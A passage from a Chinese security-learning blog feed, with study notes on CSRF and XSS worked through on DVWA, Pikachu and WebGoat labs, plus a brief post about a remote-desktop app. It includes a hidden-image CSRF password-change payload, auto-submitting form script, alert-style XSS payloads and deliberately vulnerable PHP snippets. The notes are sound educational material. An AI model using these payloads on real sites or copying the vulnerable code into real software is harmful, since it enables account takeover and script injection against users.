  </entry>
  
  
  
  <entry>
    <title>csrf学习笔记</title>
    <link href="/2022/03/13/csrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/03/13/csrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>CSRF（Cross-Site Request Forgery）跨站点请求伪造，也被称为One Click Attack或者Session Riding。指利用受害者<strong>未失效的身份认证信息</strong>（cookie、session等），诱骗<strong>其点击恶意链接或者访问包含攻击代码的页面</strong>，在受害人不知情的情况下，<strong>以受害人的身份</strong>向（身份认证信息所对应的）服务器发送请求，从而<strong>完成非法操作</strong>（如转账、改密等）的一种攻击行为。</p><span id="more"></span><hr><h3 id="对CSRF漏洞的理解"><a href="#对CSRF漏洞的理解" class="headerlink" title="对CSRF漏洞的理解"></a>对CSRF漏洞的理解</h3><p>csrf同xss看起来有点像，都是攻击者构造url，诱骗用户点击来触发漏洞。</p><p>不同的是xss的攻击代码是代码注入，是利用了站点HTML语言构造的缺陷，payload是嵌入到页面中的HTML代码中的。而csrf攻击的payload中没有闭合HTML结构的语句，是直接利用了已登录用户的身份信息来执行站点命令。</p><p>CSRF的攻击有以下两个重点</p><ul><li>目标用户已经登录了网站，能够执行网站的功能</li><li>目标用户访问了攻击者构造的URL</li></ul><hr><h3 id="CSRF漏洞利用"><a href="#CSRF漏洞利用" class="headerlink" title="CSRF漏洞利用"></a>CSRF漏洞利用</h3><p>根据网站页面的漏洞构造payload，在用户登录的情况下点击后，凭借用户的信息去执行一系列命令。</p><p>以dvwa的csrf靶场中的low级别为例，在这里假设我们的目的为修改某一个用户的密码。</p><p>在这关中直接构造一个链接即可，用户点击这个链接就会执行命令。为了增加隐蔽性，我们可以在自己的站点设置HTML文件，使得其访问链接不包含参数，看上去危险性会比较低，更容易使用户访问。</p><p>这个HTML网页可以这样写</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">&lt;!DOCUPYTE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>&lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>&lt;title&gt;img_src_get&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;get <span class="hljs-keyword">for</span> img src&lt;/h1&gt;<br>&lt;img stytle=<span class="hljs-string">&quot;display:none&quot;</span> src=<span class="hljs-string">&quot;http://192.168.111.142/DVWA-master/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change&quot;</span>alt=<span class="hljs-string">&quot;&quot;</span>&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></div></td></tr></table></figure><p>这样当用户访问我们站点时，遇到img，发送get请求去找图片的资源。而这里的请求不是访问图片而是访问我们构造好的url，其作用是访问具有csrf漏洞的对应站点并执行一系列命令。</p><p>另外我们也可以利用burp生成CSRF Poc页面的功能，来生成陷阱html文件。</p><p>先抓取修改密码时的数据包，action中选择CSRF Poc，根据这个数据包生成一个html文件。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220314212232.png"></p><p>根据刚才数据包提交的参数，这里创建了一个表单，并隐藏了对应参数。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220314214047.png"></p><p>在用户已经登录了对应站点的情况下，当用户点击提交时，就会利用当前用户的身份去执行form action中的操作，在这里即为修改对应站点账号的密码。</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//值得注意的是，这样的话需要用户点击链接后再点击一下提交才能实现攻击，成功率可能较低</span><br><span class="hljs-comment">//所以我们可以加上下面一段js代码，使得当页面加载完成时自动提交表单</span><br><br>&lt;script&gt;<br><br><span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;submit&quot;</span>).click();<span class="hljs-comment">//typt=&quot;submit&quot;的属性框中加上对应的id=&quot;submit&quot;</span><br><br>&#125;         <br><br>&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>当用户点击提交后就可以看到密码已被修改。实际情况下攻击者构造的陷阱网页不会这么明显，不会使用户意识到发生了什么。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220314215711.png"></p><h3 id="CSRF漏洞代码分析及防御措施"><a href="#CSRF漏洞代码分析及防御措施" class="headerlink" title="CSRF漏洞代码分析及防御措施"></a>CSRF漏洞代码分析及防御措施</h3><p>…实际上存在csrf漏洞的网页的代码在结构和逻辑上并没有什么特性，为用户设置身份信息且用户有一些执行命令的权限以及对用户身份验证环节的薄弱（或身份信息易被伪造）就是存在csrf漏洞网站的共同点。</p><p>出现scrf漏洞的原因就是网站过于相信用户，攻击者可以伪造用户请求，由此可知，抵御csrf攻击的关键在于：在请求中放入攻击者不能伪造的信息。例如可以在http请求中以参数的形式加入一个随机产生的token，并在服务器验证token，如果请求中没有token或者token中的内容不正确，则认为该请求可能是csrf攻击从而拒绝该请求。</p><hr><p>参考：《web安全攻防》</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>csrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>F**k_Rd_client</title>
    <link href="/2022/03/11/F-k-Rd-client/"/>
    <url>/2022/03/11/F-k-Rd-client/</url>
    
    <content type="html"><![CDATA[<p>I NEED CHINESE!</p><span id="more"></span><hr><p>试了下微软自带的远程桌面，加上用了别人的内网穿透服务，想着体验应该会美滋滋，结果用的蓝牙键盘输入不了中文</p><p>本来想写下使用体验和总结一下学到的内网穿透的知识，无奈之下用远程桌面玩了一晚上游戏😉</p><p><em>原计划这篇文章该是我当晚用着远程桌面时用全英文发的，不过在我输入第一句话时想了想微软的英文是啥后放弃了</em></p><hr><p>使用体验更新：这个远程桌面不用额外连接键盘，可以用自带的虚拟键盘，输入有点不习惯但完全静音，适合深夜躺在床上用。</p><p>虚拟键上的快捷键按上去有点..有趣</p><p>本身的清晰度和流畅度也不错，和串流的效果五五开吧，唯一可惜的就是不能外接键盘了，而且虚拟机内键盘用不了</p><hr><p>再更：下载了老版本机翻过的rd client，所有功能都正常。</p><p>负向升级微软真有你的。</p><hr><p>rd client is fine.</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xss靶场练习</title>
    <link href="/2022/03/08/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/03/08/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>下面是我从各大靶场（dvwa、pickachu、WebGoat）中选出的几个比较有代表性的xss例题。</p><span id="more"></span><hr><p>关于xss基础部分详见我这一篇博客：<a href="https://eggswoo.com/2022/03/05/xss%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">传送门–xss学习笔记</a></p><hr><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt;<br>&lt;a href=javascript:alert(<span class="hljs-number">1</span>)&gt;<span class="hljs-comment">//利用了JavaScript的通信协议</span><br>&lt;img src=x onerror=alert(<span class="hljs-number">1</span>)&gt;<span class="hljs-comment">//图片加载错误触发，无script标签</span><br><span class="hljs-comment">//结合编码</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>题目来源：pikachu–xss之href输出</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220310201517.png"></p><p>我们的输入被放在了href标签内。</p><p>这种情况下除了考虑闭合&lt;a&gt;标签外，还可以利用JavaScript的通讯协议。javascript 通信协议是一个伪协议, 用于指定 URL 为 JavaScript 代码。也就是说我们可以直接在href标签内根据一下通信格式输入JavaScript代码：</p><figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></div></td></tr></table></figure><hr><p>题目来源： pikachu–xss之htmlspecialchars</p><p>htmlspecialchars() 函数把预定义的字符转换为 HTML,也就是我们主要输入的&lt;、&gt;会失去作用。</p><p>htmlspecialchars()语法：htmlspecialchars(string,flags,character-set,double_encode)</p><p>其中可用的quotestyle类型：<br>ENT_COMPAT - 默认。仅编码双引号<br>ENT_QUOTES - 编码双引号和单引号<br>ENT_NOQUOTES - 不编码任何引号</p><p>默认情况下是不会编码单引号的，所以如果使用了htmlspecialchars（）来过滤的话我们只能试试用单、双引号闭合语句来构造payload。</p><hr><h3 id="储存型xss"><a href="#储存型xss" class="headerlink" title="储存型xss"></a>储存型xss</h3><p>题目来源：pikachu–xss之盲打</p><p>我们输入的数据不会显示出来，只有管理员在后台查看时才能触发。虽然此时进行xss攻击比较困难，但一旦成功即可盗取网站管理员信息。</p><hr><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><h4 id="题目来源：dvwa–XSS-DOM-high级别"><a href="#题目来源：dvwa–XSS-DOM-high级别" class="headerlink" title="题目来源：dvwa–XSS (DOM),high级别"></a>题目来源：dvwa–XSS (DOM),high级别</h4><p>前端相关代码（与参数有关的JavaScript代码部分）：<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220308133519.png"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( array_key_exists( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !is_null (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br><br>    <span class="hljs-comment"># White list the allowable languages</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;French&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;English&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;German&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;Spanish&quot;</span>:<br>            <span class="hljs-comment"># ok</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            header (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>            <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure><p>因为是dom类型，所以可以从前端相关JavaScript代码分析。开发者使用了一段js代码来生成下拉列表，我们提交的参数会被设为下拉列表的选项并显示出来。如果不用考虑这个php文件的话，我们只需要将提交的参数设为JavaScript代码即可。而根据这个php源码来看，GET方式接收输入（即<code>default</code>参数）后进行白名单检测，然后只有在白名单中的输入才会继续进程，否则退出。从代码上看这个php文件直接过滤掉了我们的payload。</p><p>关于这关，我们可以利用#来绕过。<strong>这是因为url中的#是位置标符，代表浏览器页面中的一个位置。#是用来指导浏览器动作的，对服务端完全无用，所以http请求中不含有#，即我们url中#后的数据不会提交到服务器解析。</strong>所以有这么一个现象：如果我们在任意url后按回车，页面会刷新；而在url添加了#字符后，按回车没有使页面刷新，倒是会使页面移到最上方。这就是#指导浏览器动作的体现。（也因为这个特性，sql注入时我们需要将#上传到服务端，所以不能直接输入#，而是输入url编码后的#，即%23。）</p><p>根据浏览器url的这个特性，我们可以的payload可以设为<code>白名单中的参数+#+js攻击代码</code>。但又因为我们构造好payload后需要提交新数据，所以需要改变#号之前的内容，这样按回车后数据才会重新上传（注意参数也要通过白名单检测）。我们可以在#之前添加空格或是换成白名单中的其它内容，即<code>English #&lt;script&gt;alert(1)&lt;/script&gt;</code>。</p><p>提交这个参数的话，服务器只会接收到<code>English</code>,然后解析php文件，再把数据包发给用户，接着用户的浏览器把服务器发来的html文件渲染成网页。在浏览器渲染页面的过程中，会构建DOM 树并加载JavaScript文件。在这一步中前端的JavaScript接收的参数是来自页面而非服务器的完整payload，接着JavaScript代码与DOM树的交互，所以js攻击代码被显示到页面中并且生效，我们即实现了一次xss攻击。</p><p><strong>关键点：虽然有提交参数到服务器的过程，但我们利用#使得payload没有传递到服务器</strong>（这点是#的利用）</p><p><strong>同时，页面构造DOM树，加载JavaScript的时候早已没有服务器参与，读取我们输入数据，导致触发xss</strong>(这是dom的特性)</p><p>可以看出DOM类型的xss漏洞有这个特点，在客户端的浏览器把接收到的HTML文件渲染成网页时，JavaScript和DOM树在这个过程交互后才形成的xss攻击，这个阶段服务器是不参与的，payload也不会进过服务器。所以针对dom类型的xss，在前端设置限制会是更有效的方式。</p><hr><h4 id="题目来源：WebGoat-A7lesson-10"><a href="#题目来源：WebGoat-A7lesson-10" class="headerlink" title="题目来源：WebGoat A7lesson 10"></a>题目来源：WebGoat A7lesson 10</h4><p>题目介绍：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220313160037.png"></p><p>这里告诉了我们DOM型xss可能在客户端中代码的<code>route configuration</code>找到。这个route我个人理解为path，和<code>configuration</code>连在一起就是规定了网页生成时会调用那些文件，怎么调用这些文件，这些文件在哪里。</p><p>生产环境中的人员会为了测试网页工作的效果，会写一些测试用的js文件。而产品实际上线时，开发者又可能忘了修改这些配置信息和删除js文件。</p><p>这里url中的<code>start.mvc#</code>。这个就被称为base route，这个后面接上参数就可以调用对应的js代码。此时可以看到 这里后面的参数为<code>lesson</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220313161634.png"></p><p>通过这个base route（start.mvc#）接口，lesson即为一个调用的模块，其后的参数为对应的文件。</p><p>我们就可以在前端源码中查找有无其它可以被调用的模块，这些模块会不会接受一些参数，使得这些参数显示在前端从而触发xss。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220313162959.png"></p><p>在GoatRouter.js文件中，找到了有关route的配置信息。</p><p>这里就说明了start.mvc#后可以跟上五种参数：welcome、lesson/:name、lesson/:name/:pageNum</p><p>、  test/:param 、reportCard，分别会调用其对应的函数。我们可以继续在源码中搜素对应函数，查看我们输入的参数去向，会不会对前端造成影响。</p><p>在这里根据提示，我们也可以直接先尝试在url中调用test，模块，看看会产生什么后果。输入payload：<code>http://127.0.0.1:8080/WebGoat/start.mvc#test/123</code></p><p> <img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220313164128.png"></p><p>原封不动的显示出了我们的参数。所以这道题的答案是<code>start.mvc#test/</code></p><p>假如我们在这后面添加JavaScript代码，也就触发了xss漏洞（这也是下一关的内容）。但是需要注意的是，js代码中的<code>/</code>符号需要进行url编码，因为<code>/</code>会被当作路径的分隔符，test后面接收的参数从是<code>/</code>开始到下一个<code>/</code>结束。当然全部进行url编码也可以。</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss学习笔记</title>
    <link href="/2022/03/05/xss%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/03/05/xss%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>xss，即跨站脚本攻击,实际上是<strong>在前端注入js编写的恶意代码。</strong>（普遍为js代码,因为js代码能完成的功能比较强大）该漏洞产生的危害取决于js执行了怎样的脚本代码。当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。如果用户输入中某个参数的全部或其中一部分，原封不动地在源代码里出现时，我们就可以认为这个参数存在XSS漏洞。</p><span id="more"></span><hr><h3 id="xss的分类"><a href="#xss的分类" class="headerlink" title="xss的分类"></a>xss的分类</h3><p>xss被普遍分为以下三类：</p><ul><li><p>反射型xss</p><p>反射性又称非持久性xss,这种攻击方式往往具有一次性。</p><p>攻击方式：攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后目标服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss的恶意脚本后，就会触发xss漏洞。</p></li><li><p>储存型xss</p><p>储存型xss又称持久型xss,攻击脚本将被永久地存在目标服务器的数据库或文件中，具有很高的隐蔽性。</p></li></ul><p>​        攻击方式：这种攻击多见于论坛、博客和留言版，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注        入帖子的内容中。随着帖子被服务器储存下来，恶意脚本也永久地被存放在服务器的后端储存器中。当其他        用户浏览这个被注入恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。如攻击者在留言板中加入        以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;script&gt; alert(<span class="hljs-regexp">/hacker/</span>)&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>​        当其他用户访问留言版时，就会看到一个弹窗。储存型xss的攻击方式能够将恶意代码永久地嵌入一个页中，        所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型xss攻击将没有多大        作为，而储存型xss则不同，由于它注入在一些我们信任的页面，因此无论我们多么小心，都难免会受到击。</p><ul><li><p>DOM型xss</p><p>DOM全称Document Object Model，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。DOM型xss其实是一种特殊类型的反射型xss，它是基于DOM文档对象模型的一种漏洞。</p><p>HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点数。通过HTML DOM，书中的所有节点均可通过JavaScript进行访问。所有HTML元素（节点）均可被修改，也可以创建或删除节点。HTML DOM 数结构如下图所示：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/ct_htmltree.gif"></p></li></ul><p>​        在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面内创建一个顶级的Document object文档        对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。        可以通过js脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM动        态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于        DOM型的xss漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。</p><p>​        攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器响应后形成        HTML文件发送给用户。当用用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致触发xss漏洞</p><p>​        <em>DOM类型的xss看似比较复杂，其核心特点就是利用DOM树和JavaScript的交互来改变页面元素，我们即利用        这个特性使页面元素包含JavaScript恶意代码，来完成xss攻击。</em></p><hr><h3 id="xss产生的原理"><a href="#xss产生的原理" class="headerlink" title="xss产生的原理"></a>xss产生的原理</h3><h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a><strong>反射型xss</strong></h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>       <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>]))<br>       &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;input type=&quot;text&quot; value=&quot;&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>].<span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;            <br>       &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>当我们在输入框中输入字符串时，即<code>&#39;str&#39;=abc</code>，代码正常运作；但当我们输入构造的JavaScript代码时，即访问xx/xx.php?str=<code>&quot;&gt;&lt;img src=1 onerror=alert(/xss/) /&gt;</code>，此时<code>echo</code>语句输出的是</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">&lt;input type=<span class="hljs-string">&quot;text&quot;</span> value=<span class="hljs-string">&quot;&quot;</span>&gt; &lt;img src=<span class="hljs-number">1</span> onerror=alert(/xss/) /&gt; <span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string">//即闭合了前面的标签，并导致输入的&lt;img src=1 onerror=alert(/xss/) /&gt;变成了HTML的标签</span><br></code></pre></div></td></tr></table></figure><p>所以当浏览器访问这个页面时，输出到页面的HTML代码变为了<code>&lt;img src=1 onerror=alert(/xss/) /&gt;</code>。此行代码的作用： img读取错误，引发了onerror从而执行alert函数，显示”xss“的弹窗 。（onerror，当视频的媒体数据加载期间发生错误时执行JavaScript代码）</p><hr><h4 id="储存型xss"><a href="#储存型xss" class="headerlink" title="储存型xss"></a><strong>储存型xss</strong></h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$con</span>=mysqli_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>)<br>    <span class="hljs-comment">//连接数据库</span><br>    <span class="hljs-variable">$result1</span>=mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;insert into table(&#x27;title&#x27;,&#x27;content&#x27;) VALUES (&#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tittle&#x27;</span>].<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>].<span class="hljs-string">&quot;&#x27;)&quot;</span>);<br><span class="hljs-comment">//将用户输入插入到数据库中</span><br>    <span class="hljs-variable">$result2</span>=mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from table&quot;</span>);<br><span class="hljs-comment">//读取数据库数据</span><br>    <span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result2</span>);<br><span class="hljs-comment">//将读取到的数据转为数组形式准备输出</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;title&#x27;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;comtent&#x27;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&quot;</span>;<br><span class="hljs-comment">//将读取到的数据库内容输出</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>这里的<code>$_POST[&#39;title&#39;]</code>和 <code>$_POST[&#39;comtent&#39;]</code> 都是注入点。拿<code>&#39;title&#39;</code>来举例，当用户在标题处写入<code>&lt;img src=1 onerror=alter(/xss/)/&gt;</code>,在数据库存入的即为</p><table><thead><tr><th>id</th><th>title</th><th>content</th></tr></thead><tbody><tr><td>1</td><td>&lt;img src=1 onerror=alter(/xss/)/&gt;</td><td>xxx</td></tr></tbody></table><p>而当title输出到页面时，页面执行了<code>&lt;img src=1 onerror=alter(/xss/)/&gt;</code>,导致弹窗。</p><hr><h4 id="DOM型xss攻击"><a href="#DOM型xss攻击" class="headerlink" title="DOM型xss攻击"></a><strong>DOM型xss攻击</strong></h4><p><strong>DMO型xss程序只有HTML代码，并不存在服务器端代码，所以此程序并没有与服务器端交互。</strong></p><p>也就是说在dom型xss中，用户提交的数据，（也就是攻击者构造的payload），是不会进入服务器端的，服务器不知道自己受到了dom型xss攻击。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    fuction myfuction()&#123;<br>     document.getElementById(<span class="hljs-string">&quot;id1&quot;</span>).innerHTML=<br>document.getElementBtId(<span class="hljs-string">&quot;dom_input&quot;</span>).value;<br>    &#125;<br>&lt;/script&gt;<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span>method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> id=<span class="hljs-string">&quot;dom_input&quot;</span> value=<span class="hljs-string">&quot;输入&quot;</span>&gt;&lt;br/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;button&quot;</span> value=<span class="hljs-string">&quot;替换&quot;</span> onclick=<span class="hljs-string">&quot;myfuction()&quot;</span>&gt;<br>&lt;/form&gt;<br></code></pre></div></td></tr></table></figure><p>单机“替换”按钮时会执行JavaScript的myfunction()函数，而myfunction()函数是一个DOM操作，通过document.getElementById获取ID为id1的节点，然后将节点id1的内容修改为dom_input中的值，即用户输入的值。当输入<code>&lt;img src=1 onerror=alter(/xss/)/&gt;</code>时，单击”替换“按钮，我们输入的数据又会输出到页面上，所以页面弹出消息框。但由于是隐式输出的，所以在查看源代码时，看不到输出的xss代码</p><hr><h3 id="xss漏洞容易出现的地方"><a href="#xss漏洞容易出现的地方" class="headerlink" title="xss漏洞容易出现的地方"></a>xss漏洞容易出现的地方</h3><p>来自靶场webgoat的总结</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220310231605.png"></p><p>xss漏洞常见地点：</p><ul><li><p>将用户搜索的字符串回显出来的字段。（如搜搜索引擎会弹出，没有找到关于“xxx”的内容这一字段）</p></li><li><p>显示用户输入的输出区域。（如留言版）</p></li><li><p>返回包含用户所提交的数据的报错信息。</p></li><li><p>包含用户提交的信息的隐藏字段。</p></li><li><p>展示用户输入数据的任何页面</p><ul><li>留言版</li><li>没有限制的评论</li></ul></li><li><p>HTTP头</p></li></ul><hr><h3 id="xss的危害"><a href="#xss的危害" class="headerlink" title="xss的危害"></a>xss的危害</h3><p><em>盗取cookie、钓鱼攻击、流量指向等。还能配合别的漏洞，比如可以和网页木马结合，使受害者跳转到网马地址，网马地址被执行后续就控制一些权限。</em></p><hr><h3 id="xss漏洞利用过程"><a href="#xss漏洞利用过程" class="headerlink" title="xss漏洞利用过程"></a>xss漏洞利用过程</h3><p>下面以dvwa的low级别反射型xss来演示,如何利用xss漏洞产生渗透效果</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span 